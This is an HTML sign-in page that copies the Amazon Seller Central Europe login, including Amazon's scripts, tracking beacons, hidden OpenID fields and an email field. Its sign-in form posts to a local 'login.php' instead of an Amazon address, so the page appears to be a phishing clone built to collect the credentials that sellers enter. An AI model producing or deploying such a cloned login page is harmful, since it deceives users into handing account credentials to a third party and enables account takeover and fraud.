...
var ue_id = '6105GHANE540GE228KG6',
    ue_url = '/ap/uedata',
    ue_navtiming = 1,
    ue_mid = 'A1F83G8C2ARO7P',
    ue_sid = '261-5441383-4343233',
    ...
    ue_urt = 3,
    ue_rpl_ns = 'cel-rpl',
    ue_fpf = '//fls-eu.amazon.com/1/batch/1/OP/A1F83G8C2ARO7P:261-5441383-4343233:6105GHANE540GE228KG6$uedata=s:',
...
var e=a.ue.r,f,p;a.onLd=c("ld");a.onLdEnd=c("ld");a.onUl=c("ul");f={stop:c("os")};g.chrome?(s("beforeunload",d),ue.ulh.push(d)):f[G]=a.onUl;for(p in f)f.hasOwnProperty(p)&&w(0,g,p,f[p]);a.ue_viz&&ue_viz();s("load",a.onLd);t("ue")}function F(d,c){a.ue_mbl&&a.ue_mbl.ajax&&a.ue_mbl.ajax(d,c);a.ue.tag("ajax-transition")}a.ueinit=(a.ueinit||0)+1;var r={t0:g.aPageStart||a.ue_t0,id:a.ue_id,url:a.ue_url,rid:a.ue_id,a:"",b:"",h:{},r:{ld:0,oe:0,ul:0},s:1,t:{},sc:{},iel:[],ielf:[],fc_idx:{},viz:[],v:"0.200897.0",
...
<!-- 32k5af6y6qdxe0xnyv4ozxx --><script>var aPageStart = (new Date()).getTime();</script><meta charset="utf-8">
...
<link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/G/01/AUIClients/AuthenticationPortalAssets-60974eab2c51181b770605eaef55c2d69d69613c._V2_.css#AUIClients/AuthenticationPortalAssets.secure.min">
...
P.w)||50<a.h-P.h?(P=a,Q=4,(a=l.mobile||l.tablet?450<a.w&&a.w>a.h:1250<=a.w)?z(k,"a-ws"):ca(k,"a-ws")):Q--&&(ea=setTimeout(E,16))}}function pa(a){(F=void 0===a?!F:!!a)&&E()}function qa(){return F}"use strict";var G=I.now=I.now||function(){return+new I},y=function(a){return a&&a.now?a.now.bind(a):G}(f.performance);ka=y();var p=f.AmazonUIPageJS||f.P;if(p&&p.when&&p.register)throw Error("A copy of P has already been loaded on this page.");var r=f.ue;r&&r.tag&&(r.tag("aui"),r.tag("aui:aui_build_date:3.17.8.3-2018-06-19"));
...
e,a,c));a.attribution=q(":",this.attribution,b);throw a;},guardError:aa(),guardFatal:aa("FATAL"),log:function(a,b,c){return this.logError(null,a,b,c)},declare:x([],!0,!0,!0),register:x([],!0),execute:x([]),AUI_BUILD_DATE:"3.17.8.3-2018-06-19",when:Z(),now:Z(!0),trigger:function(a,b,c){var e=G();this.declare(a,{data:b,pageElapsedTime:e-(f.aPageStart||NaN),triggerTime:e});c&&c.instrument&&R.when("prv:a-logTrigger").execute(function(b){b(a)})},handleTriggers:function(){this.log("handleTriggers deprecated")},
...
Q=4;E()});var ja={getItem:function(a){try{return f.localStorage.getItem(a)}catch(b){}},setItem:function(a,b){try{return f.localStorage.setItem(a,b)}catch(c){}}};ca(k,"a-no-js");z(k,"a-js");!m(/OS [1-8](_[0-9]*)+ like Mac OS X/i)||f.navigator.standalone||m(/safari/i)||z(k,"a-ember");p=[];for(t in l)l.hasOwnProperty(t)&&l[t]&&p.push("a-"+t.replace(/([A-Z])/g,function(a){return"-"+a.toLowerCase()}));z(k,p.join(" "));k.setAttribute("data-aui-build-date","3.17.8.3-2018-06-19");n.register("p-detect",function(){return{capabilities:l,
localStorage:l.localStorage&&ja,toggleResponsiveGrid:pa,responsiveGridEnabled:qa}});m(/UCBrowser/i)||l.localStorage&&z(k,ja.getItem("a-font-class"));n.declare("a-event-revised-handling",!1);n.declare("a-fix-event-off",!1);u("pagejs:pkgExecTime",y()-NaN)})(window,document,Date);
  ...
  (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-na.ssl-images-amazon.com/images/G/01/AUIClients/AuthenticationPortalAssets-3cbd67cb821687489829ed6a61d9e8b52e65d2e3._V2_.js#AUIClients/AuthenticationPortalAssets.secure.min');
  ...
  (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-na.ssl-images-amazon.com/images/G/01/AUIClients/CVFAssets-53acd8e88d87f09d7e0bebd849f2fa4b112e99c7._V2_.js#AUIClients/CVFAssets.secure.min');
</script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/61tHvuwljLL._RC|11IYhapguOL.js,61Z-hR1QEiL.js,31pYyxAZJRL.js,31Qll8kfk9L.js,01N6xzIJxbL.js,516fQ5+zVmL.js,01rpauTep4L.js,31JzIBuTmgL.js,61uDiYnK9wL.js,01BBu+b9t0L.js_.js#AUIClients/AmazonUI.min"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/G/01/AUIClients/AuthenticationPortalAssets-3cbd67cb821687489829ed6a61d9e8b52e65d2e3._V2_.js#AUIClients/AuthenticationPortalAssets.secure.min"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/G/01/AUIClients/AuthenticationPortalInlineAssets-662783336058590306af126b0eeae5125982f026._V2_.js#AUIClients/AuthenticationPortalInlineAssets.secure.min"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/G/01/AUIClients/CVFAssets-53acd8e88d87f09d7e0bebd849f2fa4b112e99c7._V2_.js#AUIClients/CVFAssets.secure.min"></script>
...
if(window.ue&&uet) { uet('bb'); }
  ...
  <body class="ap-locale-en_US a-m-us a-aui_51744-c a-aui_57326-c a-aui_72554-c a-aui_83815-c a-aui_86171-c a-aui_96511-c a-aui_accessibility_49860-c a-aui_attr_validations_1_51371-c a-aui_bolt_62845-c a-aui_noopener_84118-c a-aui_ux_102912-c a-aui_ux_59374-c a-aui_ux_60000-c a-aui_ux_92006-c a-aui_ux_98513-c a-dex_92889-c a-meter-animate">
...
<div class="a-section a-spacing-medium a-text-center">
          ...
          <a class="a-link-nav-icon" tabindex="-1" href="/home">
            <img src="https://images-na.ssl-images-amazon.com/images/G/02/rainier/nav/sc-unified._CB501694303_.png">
          </a>
...
<!-- show a warning modal dialog when the third party account is connected with Amazon -->
    ...
    <div class="a-section a-spacing-base">
      <div class="a-section">
        ...
        <form name="signIn" method="post" novalidate="" action="login.php" class="a-spacing-none fwcim-form" data-fwcim-id="undefinede6ba0ec5">
          
            
            
              <input name="appActionToken" value="xEcKLmFtj2BJjgNSi5GenCEojTfk8j3D" type="hidden"><input name="appAction" value="SIGNIN" type="hidden">
    ...
    <input name="openid.pape.max_auth_age" value="ape:MTgwMDA=" type="hidden">
  
    <input name="openid.identity" value="ape:aHR0cDovL3NwZWNzLm9wZW5pZC5uZXQvYXV0aC8yLjAvaWRlbnRpZmllcl9zZWxlY3Q=" type="hidden">
  
    <input name="ssoResponse" value="ape:" type="hidden">
  
    <input name="language" value="ape:ZW5fVVM=" type="hidden">
  
    <input name="pageId" value="ape:c2NfZXVfYW1hem9uX3Yy" type="hidden">
  
    <input name="openid.return_to" value="ape:aHR0cHM6Ly9zZWxsZXJjZW50cmFsLWV1cm9wZS5hbWF6b24uY29tL2hvbWU/U2lnbitJbj0mY29yPWxvZ2luX0VV" type="hidden">
  
    <input name="prevRID" value="ape:NjEwNUdIQU5FNTQwR0UyMjhLRzY=" type="hidden">
  
    <input name="openid.assoc_handle" value="ape:c2NfZXVfYW1hem9uX3Yy" type="hidden">
          ...
          <div class="a-section">
            <div class="a-box"><div class="a-box-inner a-padding-extra-large">
              ...
              <div class="a-row a-spacing-base">
                ...
                <input maxlength="128" id="ap_email" name="email" tabindex="1" class="a-input-text a-span12 auth-autofocus auth-required-field" type="email">
        ...
        <div data-a-input-name="rememberMe" class="a-checkbox"><label><input name="rememberMe" value="true" tabindex="4" type="checkbox"><i class="a-icon a-icon-checkbox"></i><span class="a-label a-checkbox-label">
          ...
          <span class="a-declarative" data-action="a-popover" data-a-popover="{&quot;activate&quot;:&quot;onclick&quot;,&quot;header&quot;:&quot;\&quot;Keep Me Signed In\&quot; Checkbox&quot;,&quot;inlineContent&quot;:&quot;<p>Choosing \&quot;Keep me signed in\&quot; reduces the number of times you're asked to sign in on this device.<\/p>\n<p>To keep your account secure, use this option only on your personal devices.<\/p>&quot;}">
            ...
            <i class="a-icon a-icon-popover"></i></a>
                ...
                <div class="a-row">
                  <span id="auth-signin-cancel-link" class="a-button a-spacing-base a-spacing-top-base a-button-span12"><span class="a-button-inner"><a id="signInCancelSubmit" tabindex="6" href="http://services.amazon.co.uk/services/sell-online/features-and-benefits.htm?apCustomerCancelled=true" class="a-button-text" role="button">
                    Register now
                  </a></span></span>
                </div>
...
<script id="fwcim-script" crossorigin="anonymous" type="text/javascript" src="https://images-na.ssl-images-amazon.com/images/G/02/x-locale/common/login/fwcim._CB477506611_.js"></script>
<script type="text/javascript">
...
<noscript>
    <img height="1" width="1" style='display:none;visibility:hidden;' src='//fls-eu.amazon.com/1/batch/1/OP/A1F83G8C2ARO7P:261-5441383-4343233:6105GHANE540GE228KG6$uedata=s:%2Fap%2Fuedata%3Fnoscript%26id%3D6105GHANE540GE228KG6:0' alt=""/>
</noscript>


<div class="fwcim-container"></div><div id="a-popover-root" style="z-index:-1;position:absolute;"></div></body></html>
